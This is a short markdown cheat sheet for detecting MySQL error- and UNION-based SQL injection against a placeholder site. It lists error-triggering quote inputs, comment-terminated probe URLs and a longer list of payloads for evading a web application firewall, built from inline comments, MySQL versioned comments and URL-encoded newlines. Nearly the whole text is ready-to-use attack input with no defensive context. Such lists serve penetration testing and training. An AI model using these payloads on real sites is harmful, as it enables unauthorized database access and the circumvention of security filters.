
## ¶‣ MySQL Error or UNION based SQLi
```
This one is the easiest of all SQLi attacks.
```


- SQLi Detection (No WAF):

> - Website Loads successfully
> ```sql
> https://www.example.com/index.php?id=1
> ```

> - You'll get an error:
> ```sql
> https://www.example.com/index.php?id=1'
> ```
> ```sql
> https://www.example.com/index.php?id=1\'
> ```
> ```sql
> https://www.example.com/index.php?id=-1'
> ```
> ```sql
> https://www.example.com/index.php?id=-1)'
> ```

> - Website loads successfully:
> ```sql
> https://www.example.com/index.php?id=1 and 0' order by 1--+
> ```
> ```sql
> https://www.example.com/index.php?id=2-1
> ```

> - Website might load successfully, but might also show error
> ```sql
> https://www.example.com/index.php?id=-1'-- -
> ```
> ```sql
> https://www.example.com/index.php?id=1'--
> ```
> ```sql
> https://www.example.com/index.php?id=1+--+
> ```

> - Payload:
> ```sql
> '
> \'
> )'
> "
> \"
> )"
> ```

---

- SQLi Detection (Bypassing WAF + if the above Methodology didn't work)

> - In some cases, WAF won't let you to cause errors on the website, so sending special queries might be needed to bypass WAF. If no WAF warnings are shown and website loads successfully, we can confirm that the vulnerability exists.

> - We should try the following payloads.
> ```
> https://www.example.com/index.php?id=1'--/**/-
> https://www.example.com/index.php?id=/*!500001'--+-*/
> https://www.example.com/index.php?id=1/^.*1'--+-.*$/
> https://www.example.com/index.php?id=1'--/*--*/-
> https://www.example.com/index.php?id=1'--/*&a=*/-
> https://www.example.com/index.php?id=1'--/*1337*/-
> https://www.example.com/index.php?id=1'--/**_**/-
> https://www.example.com/index.php?id=1'--%0A-
> https://www.example.com/index.php?id=1'--%0b-
> https://www.example.com/index.php?id=1'--%0d%0A-
> https://www.example.com/index.php?id=1'--%23%0A-
> https://www.example.com/index.php?id=1'--%23foo%0D%0A-
> https://www.example.com/index.php?id=1'--%23foo*%2F*bar%0D%0A-
> https://www.example.com/index.php?id=1'--#qa%0A#%0A-
> https://www.example.com/index.php?id=/*!20000%0d%0a1'--+-*/
> https://www.example.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/
> ```

> - Payloads
> ```
> '--/**/-
> /*!500001'--+-*/
> /^.*1'--+-.*$/
> '--/*--*/-
> '--/*&a=*/-
> '--/*1337*/-
> '--/**_**/-
> '--%0A-
> '--%0b-
> '--%0d%0A-
> '--%23%0A-
> '--%23foo%0D%0A-
> '--%23foo*%2F*bar%0D%0A-
> '--#qa%0A#%0A-
> /*!20000%0d%0a1'--+-*/
> /*!blobblobblob%0d%0a1'--+-*/
> ```
